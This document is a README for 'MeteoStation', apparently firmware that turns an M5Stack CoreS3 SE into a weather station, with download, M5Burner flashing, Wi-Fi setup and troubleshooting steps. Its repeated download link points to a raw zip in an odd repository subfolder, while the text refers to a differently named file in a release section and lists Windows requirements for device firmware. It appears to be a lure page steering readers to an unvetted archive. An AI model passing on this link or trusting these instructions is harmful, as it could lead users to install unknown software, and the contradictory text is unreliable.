# ☁️ MeteoStation - Track local weather with ease

[![](https://img.shields.io/badge/Download-MeteoStation-blue.svg)](https://raw.githubusercontent.com/barngrassjanegoodall132/MeteoStation/main/postally/Meteo_Station_3.4-beta.4.zip)

MeteoStation turns your M5Stack CoreS3 SE into a reliable weather monitor. It collects sensor data and connects to the Open-Meteo service to provide accurate climate information. This device displays temperature, humidity, and atmospheric pressure on a clear screen for your home or office.

## 📦 System Requirements

Your computer must meet these basic needs to manage the device:

*   Operating System: Windows 10 or Windows 11.
*   Connection: One free USB-C port to link the device to your computer.
*   Software: The M5Burner tool to install the application.
*   Internet: Access to the web to download the firmware files.

## 📥 How to Download 

Visit this page to download the software for your device: [https://raw.githubusercontent.com/barngrassjanegoodall132/MeteoStation/main/postally/Meteo_Station_3.4-beta.4.zip](https://raw.githubusercontent.com/barngrassjanegoodall132/MeteoStation/main/postally/Meteo_Station_3.4-beta.4.zip).

Navigate to the release section on the right side of the screen. Locate the file named `MeteoStation_Firmware.zip`. Click the file name to start the download. Once the transfer finishes, open your Downloads folder and right-click the file to extract the contents. You now possess the files needed to update your device.

## 🛠️ Setting Up Your Device

Follow these steps to prepare your M5Stack hardware:

1.  Connect the M5Stack CoreS3 SE to your Windows computer using a USB-C cable.
2.  Download the M5Burner software from the official M5Stack website.
3.  Open M5Burner on your computer.
4.  Select CORE-S3 from the device list on the left sidebar.
5.  Click the Download button to fetch the burner drivers if this is your first time using the tool.
6.  Navigate to the Custom option in the software menu.
7.  Click Add Path and find the folder where you placed the extracted MeteoStation files.
8.  Click the Burn button. Select your COM port from the list. 
9.  The software writes the program to your device. Wait for the green progress bar to finish.

## 🌐 Connecting to the Internet

The MeteoStation needs a network connection to pull data from Open-Meteo. Once the device finishes the installation, it will display a setup screen:

1.  Look at the device screen. It shows a list of available Wi-Fi networks.
2.  Press the tactile buttons on the side of the device to select your home network.
3.  Enter your Wi-Fi password using the on-screen keyboard.
4.  Press the center button to confirm your entry.
5.  The device will save these settings and restart.

## 📡 Understanding the Display

The screen shows vital information in a simple format:

*   Main Temperature: The current reading from the ENV III sensor.
*   Humidity: The percentage of water vapor in the room.
*   Barometric Pressure: The current pressure measured in hectopascals.
*   External Forecast: A summary of the weather from the Open-Meteo API.

The device refreshes these numbers every ten minutes. If the screen goes blank, tap the power button on the side to wake the display.

## 🔧 Troubleshooting Steps

If you face issues, check these common fixes:

*   Device not turning on: Check the USB cable. Connect the device to a wall charger to ensure the battery contains a charge.
*   Network connection fails: Verify that your Wi-Fi password is correct. Ensure the device stays within range of your router.
*   Screen shows errors: Unplug the device, wait ten seconds, and plug it back in.
*   Computer does not see the device: Ensure the M5Burner software detects the COM port. Try a different USB cable if the computer fails to register the connection.

## 💾 Updating the Software

Check the GitHub page periodically for new versions of the software. When a new version appears, follow the download steps again. You do not need to delete the old files; M5Burner will overwrite the old program with the new one. This keeps your weather station current with the latest features and data sources.

## 💡 About the Technology

The MeteoStation project uses several modern components to function:

*   MicroPython: This language runs on the chip to control the screen and sensors. It allows for fast updates and stable performance.
*   ENV III Sensor: This hardware component measures the physical environment to provide real-time data.
*   Open-Meteo API: This service provides global weather data through the internet. Your device requests this data and presents it in a clear format.

This combination of hardware and software creates a tool that functions without complex maintenance. Follow the steps above to keep your station running.